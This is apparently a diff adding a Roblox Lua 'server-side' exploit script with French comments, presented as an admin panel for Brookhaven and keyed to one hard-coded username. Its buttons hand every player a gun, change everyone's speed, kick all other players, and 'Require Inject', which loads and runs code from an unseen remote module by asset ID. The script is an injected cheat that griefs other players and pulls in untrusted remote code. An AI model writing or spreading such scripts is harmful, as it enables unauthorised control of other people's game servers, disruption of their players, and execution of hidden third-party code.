@@ -1,0 +1,119 @@
+-- // BROOKHAVEN SERVER-SIDE ADMIN PANEL FIXED (ADMC BUILD)
+
+local Players = game:GetService("Players")
+local LOCAL_ADMIN = "JasonBoss2224" -- Mets ton pseudo ici
+
+print("[SSS] Admin GUI injecteur démarré…")
+
+-- === Fonctions Serveur ===
+local function giveItemAll(itemName)
+    for _, plr in ipairs(Players:GetPlayers()) do
+        local backpack = plr:FindFirstChildOfClass("Backpack") or plr:WaitForChild("Backpack")
+        local tool = Instance.new("Tool")
+        tool.Name = itemName
+        tool.RequiresHandle = false
+        tool.CanBeDropped = true
+        tool.Parent = backpack
+    end
+end
+
+local function setSpeedAll(speed)
+    for _, plr in ipairs(Players:GetPlayers()) do
+        if plr.Character and plr.Character:FindFirstChild("Humanoid") then
+            plr.Character.Humanoid.WalkSpeed = speed
+        end
+    end
+end
+
+local function spawnCarAll()
+    for _, plr in ipairs(Players:GetPlayers()) do
+        if plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
+            local car = Instance.new("Part")
+            car.Name = "AdminCar"
+            car.Size = Vector3.new(8,3,14)
+            car.Position = plr.Character.HumanoidRootPart.Position + Vector3.new(0,10,0)
+            car.BrickColor = BrickColor.Random()
+            car.Anchored = false
+            car.Parent = workspace
+        end
+    end
+end
+
+local function massKick()
+    for _, plr in ipairs(Players:GetPlayers()) do
+        if plr.Name ~= LOCAL_ADMIN then
+            plr:Kick("[SSS] Kické par "..LOCAL_ADMIN)
+        end
+    end
+end
+
+local function injectRequire()
+    local module = require(78790302691160)
+    module.Hload("jasonboss2224")
+end
+
+-- === Créer GUI dans PlayerGui de l’admin ===
+local function createAdminGui(player)
+    -- Nettoyage ancien
+    if player:FindFirstChild("PlayerGui") then
+        if player.PlayerGui:FindFirstChild("AdminPanel") then
+            player.PlayerGui.AdminPanel:Destroy()
+        end
+    end
+
+    local ScreenGui = Instance.new("ScreenGui")
+    ScreenGui.Name = "AdminPanel"
+    ScreenGui.ResetOnSpawn = false
+
+    local Frame = Instance.new("Frame")
+    Frame.Size = UDim2.new(0,220,0,280)
+    Frame.Position = UDim2.new(0.05,0,0.25,0)
+    Frame.BackgroundColor3 = Color3.fromRGB(25,25,25)
+    Frame.Parent = ScreenGui
+
+    local title = Instance.new("TextLabel")
+    title.Text = "⚡ Server Admin ⚡"
+    title.Size = UDim2.new(1,0,0,40)
+    title.BackgroundColor3 = Color3.fromRGB(45,45,45)
+    title.TextColor3 = Color3.new(1,1,1)
+    title.Font = Enum.Font.GothamBold
+    title.TextSize = 18
+    title.Parent = Frame
+
+    local function makeButton(txt, order, callback)
+        local btn = Instance.new("TextButton")
+        btn.Size = UDim2.new(1,-20,0,30)
+        btn.Position = UDim2.new(0,10,0,40+(35*(order-1)))
+        btn.BackgroundColor3 = Color3.fromRGB(60,60,60)
+        btn.TextColor3 = Color3.new(1,1,1)
+        btn.Font = Enum.Font.Gotham
+        btn.TextSize = 16
+        btn.Text = txt
+        btn.Parent = Frame
+        btn.MouseButton1Click:Connect(callback)
+    end
+
+    -- Boutons Admin
+    makeButton("🚀 Give Gun",1,function() giveItemAll("Gun") end)
+    makeButton("⚡ Speed x3",2,function() setSpeedAll(100) end)
+    makeButton("🏎 Spawn Car",3,function() spawnCarAll() end)
+    makeButton("💥 Kick All",4,function() massKick() end)
+    makeButton("📦 Require Inject",5,function() injectRequire() end)
+
+    ScreenGui.Parent = player:WaitForChild("PlayerGui")
+end
+
+-- === Hook sur PlayerAdded (pour toi seulement) ===
+Players.PlayerAdded:Connect(function(plr)
+    if plr.Name == LOCAL_ADMIN then
+        createAdminGui(plr)
+        print("[SSS] GUI Admin chargé pour "..plr.Name)
+    end
+end)
+
+-- Si tu es déjà dans la partie
+local me = Players:FindFirstChild(LOCAL_ADMIN)
+if me then
+    createAdminGui(me)
+    print("[SSS] GUI Admin attaché directement à ton PlayerGui.")
+end
